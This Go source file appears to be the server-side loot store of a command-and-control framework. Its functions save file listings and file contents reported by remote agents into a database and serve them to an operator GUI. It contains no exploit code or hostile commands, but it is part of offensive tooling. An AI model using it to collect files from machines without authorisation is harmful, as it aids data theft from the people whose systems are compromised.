package main

import (
	"log"
	"strings"
	"time"
)

func storeLootFile(agentID, filename, originalPath, content, md5Hash, fileType string, commandID int) error {
	// Determine if file should be organized based on original path
	isOrganized := originalPath != ""

	// Create virtual path for organization (no actual filesystem storage)
	var virtualPath string
	if isOrganized {
		// Organized: use the original path structure
		virtualPath = originalPath
	} else {
		// Unorganized: just use filename
		virtualPath = filename
	}

	// Check if we already have this file from ls command (without content)
	var existingID int
	var existingContent string
	err := db.QueryRow(`
		SELECT id, file_content FROM loot_files 
		WHERE agent_id = ? AND original_path = ? AND (file_content = '' OR md5_hash = '')
	`, agentID, originalPath).Scan(&existingID, &existingContent)

	if err == nil {
		// Update existing entry with content
		_, err = db.Exec(`
			UPDATE loot_files 
			SET command_id = ?, md5_hash = ?, file_size = ?, file_content = ?
			WHERE id = ?
		`, commandID, md5Hash, len(content), content, existingID)
		return err
	}

	// No existing entry, create new one
	_, err = db.Exec(`
		INSERT INTO loot_files (command_id, agent_id, filename, original_path, stored_path, md5_hash, file_size, is_organized, file_content, file_type, created_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, commandID, agentID, filename, originalPath, virtualPath, md5Hash, len(content), isOrganized, content, fileType, time.Now())

	return err
}

func storeLootEntry(agentID string, entry map[string]interface{}, commandID int) error {
	// Extract entry data
	path, _ := entry["path"].(string)
	name, _ := entry["name"].(string)
	size, _ := entry["size"].(float64)
	fileType, _ := entry["type"].(string)
	if fileType == "" {
		fileType = "file" // Default to file if type not specified
	}

	// Extract content and MD5 if available (for get commands)
	var content string
	var md5Hash string
	if entryContent, ok := entry["content"].(string); ok {
		content = entryContent
	}
	if entryMD5, ok := entry["md5"].(string); ok {
		md5Hash = entryMD5
	}

	// Determine if organized (has full path)
	isOrganized := path != ""
	virtualPath := path
	if !isOrganized {
		virtualPath = name
	}

	// Check if we already have this file from ls command (without content)
	// Only try to update if this entry has content (i.e., from a get command)
	if content != "" && md5Hash != "" && path != "" {
		var existingID int
		var existingContent string
		err := db.QueryRow(`
			SELECT id, file_content FROM loot_files 
			WHERE agent_id = ? AND original_path = ? AND (file_content = '' OR md5_hash = '')
		`, agentID, path).Scan(&existingID, &existingContent)

		if err == nil {
			// Update existing entry with content
			log.Printf("Updating existing loot entry ID %d for %s with content (path: %s)", existingID, name, path)
			_, updateErr := db.Exec(`
				UPDATE loot_files 
				SET command_id = ?, md5_hash = ?, file_size = ?, file_content = ?
				WHERE id = ?
			`, commandID, md5Hash, int64(size), content, existingID)
			if updateErr != nil {
				log.Printf("Error updating loot entry: %v", updateErr)
				return updateErr
			}
			log.Printf("Successfully updated loot entry ID %d", existingID)
			return nil
		}
		// If error is not "no rows", log it
		if err != nil && !strings.Contains(err.Error(), "no rows") {
			log.Printf("Error checking for existing loot entry: %v", err)
		}
	}

	// No existing entry, or this is a discovery entry from ls, create new one
	_, err := db.Exec(`
		INSERT INTO loot_files (command_id, agent_id, filename, original_path, stored_path, md5_hash, file_size, is_organized, file_content, file_type, created_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, commandID, agentID, name, path, virtualPath, md5Hash, int64(size), isOrganized, content, fileType, time.Now())

	return err
}

func getLootFiles(agentID string) ([]map[string]interface{}, error) {
	// Don't include file_content in the list - it can be huge!
	// Content is only fetched when user explicitly downloads the file
	rows, err := db.Query(`
		SELECT id, filename, original_path, stored_path, md5_hash, file_size, is_organized, 
		       CASE WHEN file_content != '' THEN 'true' ELSE 'false' END as has_content,
		       file_type, created_at
		FROM loot_files 
		WHERE agent_id = ? 
		ORDER BY created_at DESC
	`, agentID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var files []map[string]interface{}
	for rows.Next() {
		var id int
		var filename, originalPath, storedPath, md5Hash, hasContent, fileType string
		var fileSize int
		var isOrganized bool
		var createdAt time.Time

		err := rows.Scan(&id, &filename, &originalPath, &storedPath, &md5Hash, &fileSize, &isOrganized, &hasContent, &fileType, &createdAt)
		if err != nil {
			return nil, err
		}

		// Return empty string for fileContent to maintain compatibility
		// The GUI will fetch actual content via getLootFileContent when downloading
		files = append(files, map[string]interface{}{
			"id":           id,
			"filename":     filename,
			"originalPath": originalPath,
			"storedPath":   storedPath,
			"md5Hash":      md5Hash,
			"fileSize":     fileSize,
			"isOrganized":  isOrganized,
			"fileContent":  "", // Always empty in list view for performance
			"fileType":     fileType,
			"createdAt":    createdAt,
		})
	}

	return files, nil
}

func getLootFileContent(fileID int) (string, error) {
	var content string
	err := db.QueryRow("SELECT file_content FROM loot_files WHERE id = ?", fileID).Scan(&content)
	return content, err
}

func handleLootRequest(client *Client, msg map[string]interface{}) {
	agentID, ok := msg["agentId"].(string)
	if !ok {
		client.WriteJSON(map[string]interface{}{
			"type":    "error",
			"message": "Invalid agentId",
		})
		return
	}

	files, err := getLootFiles(agentID)
	if err != nil {
		log.Printf("Error getting loot files: %v", err)
		client.WriteJSON(map[string]interface{}{
			"type":    "error",
			"message": "Failed to fetch loot files",
		})
		return
	}

	client.WriteJSON(map[string]interface{}{
		"type":    "loot_response",
		"agentId": agentID,
		"data":    files,
	})
}

func handleLootFileRequest(client *Client, msg map[string]interface{}) {
	fileID, ok := msg["fileId"].(float64)
	if !ok {
		client.WriteJSON(map[string]interface{}{
			"type":    "error",
			"message": "Invalid fileId",
		})
		return
	}

	content, err := getLootFileContent(int(fileID))
	if err != nil {
		log.Printf("Error getting loot file content: %v", err)
		client.WriteJSON(map[string]interface{}{
			"type":    "error",
			"message": "Failed to fetch file content",
		})
		return
	}

	client.WriteJSON(map[string]interface{}{
		"type":    "loot_file_response",
		"fileId":  int(fileID),
		"content": content,
	})
}
